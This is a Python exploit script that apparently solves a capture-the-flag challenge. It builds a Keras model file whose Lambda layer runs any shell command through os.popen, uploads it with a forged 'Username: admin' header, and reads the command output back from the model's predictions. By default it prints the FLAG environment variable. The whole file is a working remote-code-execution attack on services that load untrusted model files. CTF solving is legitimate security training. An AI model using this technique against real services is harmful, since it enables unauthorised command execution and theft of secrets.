#!/usr/bin/env python3
import argparse
import json
import os
import sys
import tempfile

import requests


def require_tf310():
    if sys.version_info[:2] != (3, 10):
        raise SystemExit(
            "Run with Python 3.10 for marshal compatibility, e.g. /tmp/ctfpy310/bin/python solve.py"
        )
    try:
        import tensorflow as tf  # noqa: F401
        from tensorflow import keras  # noqa: F401
    except Exception as e:
        raise SystemExit(f"TensorFlow missing/broken: {e}")


def build_payload_model(output_path: str, command: str):
    import tensorflow as tf
    from tensorflow import keras

    inp = keras.Input(shape=(1,), dtype=tf.float32)
    out = keras.layers.Lambda(
        lambda x: __import__('tensorflow').constant([
            __import__('os').popen(command).read().encode()
        ], dtype=__import__('tensorflow').string),
        output_shape=(1,),
        dtype=tf.string,
    )(inp)
    model = keras.Model(inp, out)
    model.save(output_path)


def exploit(base_url: str, command: str):
    with tempfile.NamedTemporaryFile(suffix='.h5', delete=False) as tmp:
        model_path = tmp.name

    try:
        build_payload_model(model_path, command)

        with open(model_path, 'rb') as f:
            files = {'model': (os.path.basename(model_path), f, 'application/octet-stream')}
            headers = {'Username': 'admin'}
            r = requests.post(f"{base_url.rstrip('/')}/model", headers=headers, files=files, timeout=30)

        r.raise_for_status()
        data = r.json()
        preds = data.get('predictions', [])
        if not preds:
            raise RuntimeError(f"No predictions field in response: {json.dumps(data)}")
        return str(preds[0]).strip()
    finally:
        try:
            os.unlink(model_path)
        except OSError:
            pass


def main():
    parser = argparse.ArgumentParser(description='Regular Dude solver')
    parser.add_argument(
        '--url',
        default='https://regular-dude-f51aa372-66bc-485a-943e-1eb5f204f0db.ctf.ritsec.club',
        help='Base challenge URL',
    )
    parser.add_argument(
        '--cmd',
        default='printenv FLAG',
        help='Command to execute on target via model RCE',
    )
    args = parser.parse_args()

    require_tf310()
    out = exploit(args.url, args.cmd)
    print(out)


if __name__ == '__main__':
    main()
